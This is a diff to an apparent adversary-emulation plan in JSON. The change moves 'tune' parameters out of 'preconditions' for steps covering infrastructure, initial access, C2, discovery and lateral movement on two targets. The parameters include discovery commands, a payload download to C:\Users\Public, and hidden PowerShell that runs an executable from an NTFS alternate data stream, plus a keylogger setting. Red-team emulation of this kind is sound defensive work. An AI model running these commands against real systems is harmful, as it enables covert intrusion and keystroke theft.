@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -62,7 +67,8 @@
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -72,7 +78,8 @@
                 "payload": "self.tool_name2",
                 "driveby": "self.driveby2",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -80,7 +87,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -91,7 +99,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -102,7 +111,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -112,10 +122,10 @@
                 "actuator_id": "self.actuator",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -125,10 +135,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c net localgroup Administrators"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c net localgroup Administrators"
             }
         },
         {
@@ -138,10 +148,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c net localgroup Users"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c net localgroup Users"
             }
         },
         {
@@ -152,7 +162,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -161,13 +172,13 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "file_store_server": "self.driveby_domain2",
-                    "file_name": "self.tool_name2",
-                    "output_directory": "C:\\Users\\Public",
-                    "output_file_name": "Ads.zip"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "file_store_server": "self.driveby_domain2",
+                "file_name": "self.tool_name2",
+                "output_directory": "C:\\Users\\Public",
+                "output_file_name": "Ads.zip"
             }
         },
         {
@@ -177,10 +188,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{Expand-Archive C:\\Users\\Public\\Ads.zip -DestinationPath C:\\Users\\Public\\ADS; echo 'Unzip Complete'}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{Expand-Archive C:\\Users\\Public\\Ads.zip -DestinationPath C:\\Users\\Public\\ADS; echo 'Unzip Complete'}"
             }
         },
         {
@@ -190,10 +201,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{cd C:\\Users\\Public\\ADS; C:\\Users\\Public\\ADS\\7z.exe x notepad_ads.wim; echo 'ADS Extract Complete'}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{cd C:\\Users\\Public\\ADS; C:\\Users\\Public\\ADS\\7z.exe x notepad_ads.wim; echo 'ADS Extract Complete'}"
             }
         },
         {
@@ -203,10 +214,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{start-process powershell -argumentlist '-noprofile -w hidden -command &{cd C:\\Users\\Public\\ADS; forfiles /P . /m notepad.exe /c \u201cnotepad.exe:ads_popup.exe\u201d}'; echo 'Execute ADS Complete'}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{start-process powershell -argumentlist '-noprofile -w hidden -command &{cd C:\\Users\\Public\\ADS; forfiles /P . /m notepad.exe /c \u201cnotepad.exe:ads_popup.exe\u201d}'; echo 'Execute ADS Complete'}"
             }
         },
         {
@@ -216,10 +227,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "keylog_timer": 200000
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "keylog_timer": 200000
             }
         },
         {
@@ -229,10 +240,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "ipconfig /all"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "ipconfig /all"
             }
         },
         {
@@ -242,10 +253,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "netstat -anpo tcp"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "netstat -anpo tcp"
             }
         },
         {
@@ -255,10 +266,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "whoami"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "whoami"
             }
         },
         {
@@ -270,7 +281,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1",
                 "target_2": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "LateralMovement",
@@ -281,7 +293,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1",
                 "target_2": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -292,7 +305,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1",
                 "target_2": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -303,7 +317,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Discovery",
@@ -312,10 +327,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "command": "cmd /c net localgroup Administrators"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "command": "cmd /c net localgroup Administrators"
             }
         },
         {
@@ -325,10 +340,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "command": "cmd /c net localgroup Users"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "command": "cmd /c net localgroup Users"
             }
         },
         {
@@ -339,7 +354,8 @@
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
                 "target": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -348,13 +364,13 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "file_store_server": "self.driveby_domain2",
-                    "file_name": "self.tool_name2",
-                    "output_directory": "C:\\Users\\Public",
-                    "output_file_name": "Ads.zip"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "file_store_server": "self.driveby_domain2",
+                "file_name": "self.tool_name2",
+                "output_directory": "C:\\Users\\Public",
+                "output_file_name": "Ads.zip"
             }
         },
         {
@@ -364,10 +380,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "command": "powershell &{Expand-Archive C:\\Users\\Public\\Ads.zip -DestinationPath C:\\Users\\Public\\ADS; echo 'Unzip Complete'}"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "command": "powershell &{Expand-Archive C:\\Users\\Public\\Ads.zip -DestinationPath C:\\Users\\Public\\ADS; echo 'Unzip Complete'}"
             }
         },
         {
@@ -377,10 +393,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "command": "powershell &{cd C:\\Users\\Public\\ADS; C:\\Users\\Public\\ADS\\7z.exe x notepad_ads.wim; echo 'ADS Extract Complete'}"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "command": "powershell &{cd C:\\Users\\Public\\ADS; C:\\Users\\Public\\ADS\\7z.exe x notepad_ads.wim; echo 'ADS Extract Complete'}"
             }
         },
         {
@@ -390,10 +406,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "command": "powershell &{start-process powershell -argumentlist '-noprofile -w hidden -command &{cd C:\\Users\\Public\\ADS; forfiles /P . /m notepad.exe /c \u201cnotepad.exe:ads_popup.exe\u201d}'; echo 'Execute ADS Complete'}"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "command": "powershell &{start-process powershell -argumentlist '-noprofile -w hidden -command &{cd C:\\Users\\Public\\ADS; forfiles /P . /m notepad.exe /c \u201cnotepad.exe:ads_popup.exe\u201d}'; echo 'Execute ADS Complete'}"
             }
         },
         {
@@ -403,10 +419,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "keylog_timer": 200000
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "keylog_timer": 200000
             }
         },
         {
@@ -416,10 +432,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "command": "ipconfig /all"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "command": "ipconfig /all"
             }
         },
         {
@@ -429,10 +445,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "command": "netstat -anpo tcp"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "command": "netstat -anpo tcp"
             }
         },
         {
@@ -442,10 +458,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
-                "target": "self.target_2",
-                "tune": {
-                    "command": "whoami"
-                }
+                "target": "self.target_2"
+            },
+            "tune": {
+                "command": "whoami"
             }
         },
         {
@@ -456,7 +472,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -466,7 +483,8 @@
                 "agent": "self.agent_tgt2",
                 "tool": "self.tool",
                 "target": "self.target_2"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
